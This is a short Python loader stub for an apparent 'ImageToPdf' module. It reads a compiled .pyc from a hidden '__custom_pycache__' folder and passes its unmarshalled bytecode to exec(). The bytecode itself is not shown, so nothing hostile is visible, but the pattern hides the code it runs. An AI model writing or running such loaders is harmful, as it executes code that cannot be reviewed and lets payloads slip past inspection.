
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageToPdf_76467f63d29e4b1883587d2257ea80c5.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
